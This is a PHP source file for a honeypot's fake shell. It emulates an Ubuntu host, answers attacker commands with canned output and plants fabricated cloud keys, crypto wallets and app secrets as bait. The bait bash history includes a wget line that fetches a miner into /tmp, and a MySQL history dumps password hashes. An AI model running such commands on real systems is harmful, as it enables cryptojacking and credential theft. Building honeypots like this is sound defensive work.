<?php

declare(strict_types=1);

namespace Funnypot\Protocol\Shell;

use Funnypot\Attack\CannedData;
use Funnypot\Protocol\ProtocolSession;

/**
 * A Cowrie-style medium-interaction fake shell, shared by telnet (after accept-all login) and,
 * later, SSH (behind a crypto sidecar). It is a LOOKUP TABLE, never an interpreter: each command
 * maps to canned output over a static fake filesystem. There is NO proc_open / shell_exec / exec /
 * eval, NO real filesystem access, and NO outbound socket — `wget`/`curl` return canned text and the
 * requested URL is only logged (by the listener), never fetched. Output is bounded per command.
 */
final class FakeShell
{
    private const MAX_OUTPUT = 8192;
    private const HOST = 'web01';

    /**
     * dir path → child entry names. The tree below stages a "juicy" compromised box: crypto
     * wallets, cloud/devops creds and app .env secrets under /root and /home/ubuntu, so scanners
     * dig for loot while the listener logs every path they touch. EVERY leaf below is fabricated
     * and inert (see FILES) — the wiring here only makes them discoverable via `ls`.
     */
    private const DIRS = [
        '/' => ['bin', 'boot', 'dev', 'etc', 'home', 'lib', 'opt', 'proc', 'root', 'run', 'sbin', 'srv', 'tmp', 'usr', 'var'],
        '/root' => ['.aws', '.bash_history', '.bashrc', '.binance', '.cache', '.config', '.docker', '.electrum', '.env', '.ethereum', '.kube', '.mysql_history', '.profile', '.rediscli_history', '.ssh', 'seed.txt', 'wallet.dat'],
        '/root/.ssh' => ['authorized_keys', 'id_rsa', 'id_rsa.pub', 'known_hosts'],
        '/root/.aws' => ['config', 'credentials'],
        '/root/.config' => ['gcloud', 'solana'],
        '/root/.config/gcloud' => ['application_default_credentials.json'],
        '/root/.config/solana' => ['cli', 'id.json'],
        '/root/.config/solana/cli' => ['config.yml'],
        '/root/.docker' => ['config.json'],
        '/root/.electrum' => ['config', 'wallets'],
        '/root/.electrum/wallets' => ['default_wallet'],
        '/root/.ethereum' => ['keystore'],
        '/root/.ethereum/keystore' => ['UTC--2024-01-15T09-32-14.000000000Z--00000000000000000000000000000000deadbeef'],
        '/root/.kube' => ['config'],
        '/etc' => ['passwd', 'shadow', 'hostname', 'hosts', 'os-release', 'crontab', 'ssh'],
        '/home' => ['ubuntu', 'deploy'],
        '/home/ubuntu' => ['.aws', '.bashrc', '.config', '.env', '.profile', '.ssh', 'wallet.dat'],
        '/home/ubuntu/.aws' => ['credentials'],
        '/home/ubuntu/.config' => ['solana'],
        '/home/ubuntu/.config/solana' => ['cli', 'id.json'],
        '/home/ubuntu/.config/solana/cli' => ['config.yml'],
        '/home/ubuntu/.ssh' => ['authorized_keys', 'id_rsa', 'id_rsa.pub'],
        '/var' => ['backups', 'lib', 'log', 'www'],
        '/var/www' => ['html'],
        '/var/www/html' => ['.env', 'config.php', 'index.php'],
        '/var/backups' => ['db_backup.sql.gz', 'passwd.bak'],
        '/tmp' => [],
    ];

    /**
     * file path → contents (canned, inert). Nothing here is real: keys use documented AWS example
     * IDs, `FAKE…`/`deadbeef` placeholders and RFC5737 (198.51.100.0/24) hosts; the Solana keypairs
     * are constant deadbeef/cafebabe byte patterns; the seed phrase is repeated placeholder words
     * (never a valid BIP39 mnemonic). No value controls a funded wallet or a live account. `ls -la`
     * derives each file's reported size from strlen(contents).
     */
    private const FILES = [
        '/etc/hostname' => "web01\n",
        '/etc/hosts' => "127.0.0.1 localhost\n127.0.1.1 web01\n",
        '/etc/os-release' => "PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nVERSION=\"22.04.3 LTS (Jammy Jellyfish)\"\nID=ubuntu\n",
        '/root/.bashrc' => "# ~/.bashrc\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nalias ll='ls -alF'\n",
        '/root/.profile' => "# ~/.profile\nmesg n 2> /dev/null || true\n",
        // Prime intel bait: a plausible operator history that points at every loot file above.
        '/root/.bash_history' => "ls -la\n"
            . "cat /etc/passwd\n"
            . "uname -a\n"
            . "solana balance\n"
            . "solana transfer 9xQeWvGf00000000000000000000000000000000FAKE 12.5 --from ~/.config/solana/id.json --allow-unfunded-recipient\n"
            . "geth attach /root/.ethereum/geth.ipc\n"
            . "aws s3 ls s3://prod-backups/\n"
            . "aws s3 cp s3://prod-backups/db.sql.gz /tmp/\n"
            . "mysql -u appuser -p'S3cr3t-f4ke-db-p4ss' app_prod\n"
            . "redis-cli -a FAKEredispass KEYS '*'\n"
            . "ssh deploy@198.51.100.23\n"
            . "curl -H 'Authorization: Bearer FAKEapitoken0000000000' https://api.example.com/v1/balances\n"
            . "wget http://198.51.100.50/miner -O /tmp/kdevtmpfsi\n"
            . "ps aux\n"
            . "netstat -tulpn\n"
            . "history -c\n",
        '/root/.ssh/authorized_keys' => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fakekeyfakekeyfakekey root@web01\n",
        '/root/.ssh/id_rsa' => "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA(fake, truncated)\n-----END OPENSSH PRIVATE KEY-----\n",
        '/root/.ssh/known_hosts' => "",

        // --- cloud / devops creds (all fabricated) ---
        // AKIAIOSFODNN7EXAMPLE + wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY are AWS's own doc examples.
        '/root/.aws/credentials' => "[default]\n"
            . "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
            . "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
            . "region = us-east-1\n",
        '/root/.aws/config' => "[default]\nregion = us-east-1\noutput = json\n",
        '/root/.config/gcloud/application_default_credentials.json' => "{\n"
            . "  \"client_id\": \"000000000000-fakefakefake.apps.googleusercontent.com\",\n"
            . "  \"client_secret\": \"FAKE-gcloud-client-secret-000000\",\n"
            . "  \"refresh_token\": \"1//0fFAKErefreshtokenFAKErefreshtoken000\",\n"
            . "  \"type\": \"authorized_user\"\n"
            . "}\n",
        '/root/.kube/config' => "apiVersion: v1\n"
            . "kind: Config\n"
            . "current-context: prod\n"
            . "clusters:\n"
            . "- cluster:\n"
            . "    server: https://198.51.100.10:6443\n"
            . "    certificate-authority-data: FAKECERTAUTHDATA0000000000000000\n"
            . "  name: prod-cluster\n"
            . "contexts:\n"
            . "- context:\n"
            . "    cluster: prod-cluster\n"
            . "    user: admin\n"
            . "  name: prod\n"
            . "users:\n"
            . "- name: admin\n"
            . "  user:\n"
            . "    token: FAKE.kube.admin.token.0000000000\n",
        // "auth" base64-decodes to the fabricated "fakeuser:fakepassword".
        '/root/.docker/config.json' => "{\n"
            . "  \"auths\": {\n"
            . "    \"https://index.docker.io/v1/\": {\n"
            . "      \"auth\": \"ZmFrZXVzZXI6ZmFrZXBhc3N3b3Jk\"\n"
            . "    }\n"
            . "  }\n"
            . "}\n",

        // --- crypto wallets (all fabricated) ---
        // Solana keypair = a constant 64-byte deadbeef pattern, not a random funded key.
        '/root/.config/solana/id.json' => "[222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239,222,173,190,239]\n",
        '/root/.config/solana/cli/config.yml' => "---\n"
            . "json_rpc_url: \"https://api.mainnet-beta.solana.com\"\n"
            . "websocket_url: \"\"\n"
            . "keypair_path: /root/.config/solana/id.json\n"
            . "commitment: confirmed\n",
        // Web3 v3 keystore with fabricated hex — the ciphertext decrypts to nothing.
        '/root/.ethereum/keystore/UTC--2024-01-15T09-32-14.000000000Z--00000000000000000000000000000000deadbeef' => "{\"address\":\"00000000000000000000000000000000deadbeef\",\"crypto\":{\"cipher\":\"aes-128-ctr\",\"ciphertext\":\"deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\",\"cipherparams\":{\"iv\":\"00000000000000000000000000000000\"},\"kdf\":\"scrypt\",\"kdfparams\":{\"dklen\":32,\"n\":262144,\"p\":1,\"r\":8,\"salt\":\"cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe\"},\"mac\":\"0000000000000000000000000000000000000000000000000000000000000000\"},\"id\":\"00000000-0000-0000-0000-0000deadbeef\",\"version\":3}\n",
        // Repeated placeholder words — deliberately NOT a valid BIP39 mnemonic.
        '/root/.electrum/wallets/default_wallet' => "{\n"
            . "  \"wallet_type\": \"standard\",\n"
            . "  \"use_encryption\": false,\n"
            . "  \"seed_version\": 18,\n"
            . "  \"keystore\": {\n"
            . "    \"type\": \"bip32\",\n"
            . "    \"seed\": \"gravity gravity gravity ocean ocean ocean marble marble marble sunset sunset sunset\",\n"
            . "    \"xprv\": \"xprv9s21ZrQH143K3FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE00\",\n"
            . "    \"xpub\": \"xpub661MyMwAqRbcFFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE00\"\n"
            . "  }\n"
            . "}\n",
        '/root/.electrum/config' => "{\"rpcuser\": \"user\", \"rpcpassword\": \"FAKEelectrumrpc\", \"auto_connect\": true}\n",
        '/root/seed.txt' => "gravity gravity gravity ocean ocean ocean marble marble marble sunset sunset sunset\n",
        // Binary-ish Bitcoin Core wallet stub — readable markers, no real WIF key.
        '/root/wallet.dat' => "\x00\x05b1\x00\tBtree\x00main\x00\bkeymeta1FAKEbtcWa11etAddr000000000000000000\bmkey\x01\x00encrypted-fabricated-no-funds\n",

        // --- exchange API keys (all fabricated) ---
        '/root/.binance' => "# exchange API credentials\n"
            . "BINANCE_API_KEY=FAKEbinancekeyFAKEbinancekeyFAKEbinancekeyFAKEbinancekey0000\n"
            . "BINANCE_API_SECRET=FAKEbinancesecretFAKEbinancesecretFAKEbinancesecret000000\n",

        // --- app secrets (all fabricated) ---
        '/root/.env' => "APP_ENV=production\n"
            . "APP_KEY=base64:FAKEappkeyFAKEappkeyFAKEappkeyFAKEappkey00=\n"
            . "APP_DEBUG=false\n"
            . "DB_CONNECTION=mysql\n"
            . "DB_HOST=127.0.0.1\n"
            . "DB_DATABASE=app_prod\n"
            . "DB_USERNAME=appuser\n"
            . "DB_PASSWORD=S3cr3t-f4ke-db-p4ss\n"
            . "JWT_SECRET=FAKEjwtsecret00000000000000000000000000\n"
            . "STRIPE_SECRET=sk_live_FAKEstripe000000000000000000\n"
            . "SENDGRID_API_KEY=SG.FAKEsendgrid00000.0000000000000000000000000000000000000000000\n"
            . "ETH_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/FAKEALCHEMYKEY000000000000000\n"
            . "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
            . "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
        '/root/.mysql_history' => "show databases;\n"
            . "use app_prod;\n"
            . "select user,authentication_string from mysql.user;\n"
            . "select id,email,balance from wallets order by balance desc limit 10;\n"
            . "update users set is_admin=1 where email='ops@example.com';\n"
            . "\\q\n",
        '/root/.rediscli_history' => "AUTH FAKEredispass\n"
            . "KEYS *\n"
            . "GET session:admin\n"
            . "CONFIG GET dir\n"
            . "SMEMBERS wallets:hot\n"
            . "SAVE\n",

        // --- /home/ubuntu: a second, lighter loot spread (all fabricated) ---
        '/home/ubuntu/.aws/credentials' => "[default]\n"
            . "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
            . "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
        // Distinct fabricated Solana keypair — a constant cafebabe byte pattern.
        '/home/ubuntu/.config/solana/id.json' => "[202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190,202,254,186,190]\n",
        '/home/ubuntu/.config/solana/cli/config.yml' => "---\n"
            . "json_rpc_url: \"https://api.mainnet-beta.solana.com\"\n"
            . "websocket_url: \"\"\n"
            . "keypair_path: /home/ubuntu/.config/solana/id.json\n"
            . "commitment: confirmed\n",
        '/home/ubuntu/.env' => "APP_ENV=production\n"
            . "DB_HOST=127.0.0.1\n"
            . "DB_DATABASE=app_prod\n"
            . "DB_USERNAME=appuser\n"
            . "DB_PASSWORD=S3cr3t-f4ke-db-p4ss\n"
            . "STRIPE_SECRET=sk_live_FAKEstripe000000000000000000\n",
        '/home/ubuntu/.ssh/authorized_keys' => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fakekeyfakekeyfakekey deploy@web01\n",
        '/home/ubuntu/.ssh/id_rsa' => "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA(fake, truncated)\n-----END OPENSSH PRIVATE KEY-----\n",
        '/home/ubuntu/.ssh/id_rsa.pub' => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fakekeyfakekeyfakekey ubuntu@web01\n",
        '/home/ubuntu/wallet.dat' => "\x00\x05b1\x00\tBtree\x00main\x00\bkeymeta1FAKEbtcWa11etAddr111111111111111111\bmkey\x01\x00encrypted-fabricated-no-funds\n",

        // --- /var/www/html: web app secrets (all fabricated) ---
        '/var/www/html/.env' => "APP_ENV=production\n"
            . "APP_KEY=base64:FAKEappkeyFAKEappkeyFAKEappkeyFAKEappkey00=\n"
            . "DB_CONNECTION=mysql\n"
            . "DB_HOST=127.0.0.1\n"
            . "DB_DATABASE=app_prod\n"
            . "DB_USERNAME=appuser\n"
            . "DB_PASSWORD=S3cr3t-f4ke-db-p4ss\n"
            . "REDIS_PASSWORD=FAKEredispass\n"
            . "JWT_SECRET=FAKEjwtsecret00000000000000000000000000\n"
            . "STRIPE_SECRET=sk_live_FAKEstripe000000000000000000\n"
            . "ETH_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/FAKEALCHEMYKEY000000000000000\n",
        '/var/www/html/config.php' => "<?php\n"
            . "// legacy DB config\n"
            . "\$db_host = '127.0.0.1';\n"
            . "\$db_user = 'appuser';\n"
            . "\$db_pass = 'S3cr3t-f4ke-db-p4ss';\n"
            . "\$db_name = 'app_prod';\n",
        '/var/www/html/index.php' => "<?php\nrequire __DIR__ . '/config.php';\necho 'OK';\n",
    ];

    /**
     * Run a command line and return its output. Attackers routinely chain commands
     * (`cd /tmp; wget …; chmod +x …; ./x`), so a line is split on the top-level sequencing
     * operators and each statement runs in turn against the same session (cwd carries across).
     * Conditionals are not evaluated — every segment simply runs, which is enough to look real.
     */
    public function run(string $line, ProtocolSession $s): string
    {
        $out = '';
        foreach ($this->split($line) as $statement) {
            $out .= $this->runStatement($statement, $s);
            if ($s->close || strlen($out) > self::MAX_OUTPUT) {
                break;
            }
        }
        if (strlen($out) > self::MAX_OUTPUT) {
            $out = substr($out, 0, self::MAX_OUTPUT);
        }

        return $out;
    }

    /** @return string[] Non-empty statements split on `;`, `&&`, `||` and newlines (pipes preserved). */
    private function split(string $line): array
    {
        $parts = preg_split('/\s*(?:&&|\|\||;|\r?\n)\s*/', trim($line)) ?: [];
        $parts = array_values(array_filter($parts, static fn (string $p): bool => trim($p) !== ''));

        return array_slice($parts, 0, 50);
    }

    /** Run a single statement; append output. Updates cwd / close on exit. */
    private function runStatement(string $line, ProtocolSession $s): string
    {
        $line = trim($line);
        if ($line === '') {
            return '';
        }
        // Pipes: emulate only the producer (left of the first pipe). Filters like `head`/`grep`/
        // `wc` can't be interpreted here, so their effect is dropped — the whole line is still
        // logged upstream for intel, and showing the producer's output stays believable.
        if (strpos($line, '|') !== false) {
            $segments = preg_split('/\s*\|\s*/', $line) ?: [$line];
            $line = trim($segments[0]);
            if ($line === '') {
                return '';
            }
        }
        // A leading `sudo` just runs the rest (we are already "root").
        $parts = preg_split('/\s+/', $line) ?: [];
        $cmd = strtolower($parts[0]);
        $args = array_slice($parts, 1);
        if ($cmd === 'sudo' && $args !== []) {
            return $this->runStatement(implode(' ', $args), $s);
        }

        $out = $this->dispatch($cmd, $args, $line, $s);
        if (strlen($out) > self::MAX_OUTPUT) {
            $out = substr($out, 0, self::MAX_OUTPUT);
        }

        return $out;
    }

    /**
     * @param string[] $args
     */
    private function dispatch(string $cmd, array $args, string $line, ProtocolSession $s): string
    {
        switch ($cmd) {
            case 'exit':
            case 'logout':
                $s->close = true;

                return "logout\r\n";
            case 'whoami':
                return $s->user . "\r\n";
            case 'id':
                return $s->user === 'root'
                    ? "uid=0(root) gid=0(root) groups=0(root)\r\n"
                    : "uid=1000({$s->user}) gid=1000({$s->user}) groups=1000({$s->user})\r\n";
            case 'pwd':
                return $s->cwd . "\r\n";
            case 'hostname':
                return self::HOST . "\r\n";
            case 'uname':
                return $this->uname($args);
            case 'echo':
                return implode(' ', $args) . "\r\n";
            case 'cd':
                return $this->cd($args[0] ?? '', $s);
            case 'ls':
            case 'dir':
                return $this->ls($args, $s);
            case 'cat':
            case 'head':
            case 'tail':
            case 'more':
            case 'less':
                return $this->cat($args, $s);
            case 'wget':
            case 'curl':
                // The URL is logged by the listener; we NEVER fetch it — canned output only.
                return $this->fetch($cmd, $args);
            case 'ps':
                return "  PID TTY          TIME CMD\r\n 1001 pts/0    00:00:00 bash\r\n 1042 pts/0    00:00:00 ps\r\n";
            case 'netstat':
            case 'ss':
                return "Active Internet connections\r\nProto Recv-Q Send-Q Local Address           Foreign Address         State\r\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\r\n";
            case 'ifconfig':
            case 'ip':
                return "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n        inet 10.0.0.12  netmask 255.255.255.0  broadcast 10.0.0.255\r\n";
            case 'uptime':
            case 'w':
                return " 12:04:18 up 9 days,  4:41,  1 user,  load average: 0.02, 0.05, 0.00\r\n";
            case 'free':
                return "               total        used        free      shared  buff/cache   available\r\nMem:         2039836      312904      982716        1284      744216     1560492\r\n";
            case 'clear':
                return "\033[H\033[2J";
            case 'history':
            case 'export':
            case 'set':
            case 'unset':
            case ':':
                return '';
            default:
                return "-bash: {$cmd}: command not found\r\n";
        }
    }

    /** @param string[] $args */
    private function uname(array $args): string
    {
        $flags = implode('', $args);
        if (strpos($flags, 'a') !== false) {
            return "Linux " . self::HOST . " 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\r\n";
        }
        if (strpos($flags, 'r') !== false) {
            return "5.15.0-91-generic\r\n";
        }

        return "Linux\r\n";
    }

    /** @param string[] $args */
    private function ls(array $args, ProtocolSession $s): string
    {
        $long = false;
        $path = $s->cwd;
        foreach ($args as $a) {
            if ($a !== '' && $a[0] === '-') {
                $long = $long || strpos($a, 'l') !== false;
            } else {
                $path = $this->resolve($a, $s->cwd);
            }
        }

        $entries = self::DIRS[$path] ?? null;
        if ($entries === null) {
            if (isset(self::FILES[$path])) {
                return basename($path) . "\r\n";
            }

            return "ls: cannot access '" . ($args[0] ?? $path) . "': No such file or directory\r\n";
        }
        if (!$long) {
            return ($entries === [] ? '' : implode('  ', $entries) . "\r\n");
        }

        $out = "total " . (count($entries) * 4) . "\r\n";
        foreach ($entries as $name) {
            $child = rtrim($path, '/') . '/' . $name;
            $isDir = isset(self::DIRS[$child]);
            $perm = $isDir ? 'drwxr-xr-x' : '-rw-r--r--';
            $size = $isDir ? 4096 : strlen(self::FILES[$child] ?? '');
            $out .= sprintf("%s 1 root root %6d Jan  1 12:00 %s\r\n", $perm, $size, $name);
        }

        return $out;
    }

    private function cd(string $path, ProtocolSession $s): string
    {
        $target = $this->resolve($path, $s->cwd);
        if (isset(self::DIRS[$target])) {
            $s->cwd = $target;

            return '';
        }
        if (isset(self::FILES[$target])) {
            return "-bash: cd: {$path}: Not a directory\r\n";
        }

        return "-bash: cd: {$path}: No such file or directory\r\n";
    }

    /** @param string[] $args */
    private function cat(array $args, ProtocolSession $s): string
    {
        if ($args === []) {
            return '';
        }
        $out = '';
        foreach ($args as $a) {
            if ($a !== '' && $a[0] === '-') {
                continue;
            }
            $path = $this->resolve($a, $s->cwd);
            if ($path === '/etc/passwd') {
                $out .= self::crlf(CannedData::PASSWD);
            } elseif ($path === '/etc/shadow') {
                $out .= self::crlf(CannedData::SHADOW);
            } elseif (isset(self::FILES[$path])) {
                $out .= self::crlf(self::FILES[$path]);
            } elseif (isset(self::DIRS[$path])) {
                $out .= "cat: {$a}: Is a directory\r\n";
            } else {
                $out .= "cat: {$a}: No such file or directory\r\n";
            }
        }

        return $out;
    }

    /** @param string[] $args */
    private function fetch(string $cmd, array $args): string
    {
        $url = '';
        foreach ($args as $a) {
            if ($a !== '' && $a[0] !== '-') {
                $url = $a;
                break;
            }
        }
        if ($url === '') {
            return "{$cmd}: missing URL\r\n";
        }
        $host = parse_url($url, PHP_URL_HOST) ?: 'host';

        // Plausible progress text — but NOTHING is fetched. The URL is intel, logged upstream.
        if ($cmd === 'curl') {
            return '';
        }

        return "--" . gmdate('Y-m-d H:i:s') . "--  {$url}\r\n"
            . "Resolving {$host}... 93.184.216.34\r\n"
            . "Connecting to {$host}|93.184.216.34|:80... connected.\r\n"
            . "HTTP request sent, awaiting response... 200 OK\r\n"
            . "Length: unspecified [text/html]\r\n"
            . "Saving to: 'index.html'\r\n\r\nindex.html    [ <=> ] 1.42K  --.-KB/s    in 0s\r\n";
    }

    private function resolve(string $path, string $cwd): string
    {
        if ($path === '' || $path === '~') {
            return '/root';
        }
        // `~/…` → /root/… — the session is root, and attackers reach for the loot files by tilde.
        if (strncmp($path, '~/', 2) === 0) {
            $path = '/root/' . substr($path, 2);
        }
        if ($path[0] !== '/') {
            $path = rtrim($cwd, '/') . '/' . $path;
        }
        $parts = [];
        foreach (explode('/', $path) as $p) {
            if ($p === '' || $p === '.') {
                continue;
            }
            if ($p === '..') {
                array_pop($parts);
            } else {
                $parts[] = $p;
            }
        }

        return '/' . implode('/', $parts);
    }

    private static function crlf(string $s): string
    {
        return str_replace("\n", "\r\n", $s);
    }
}
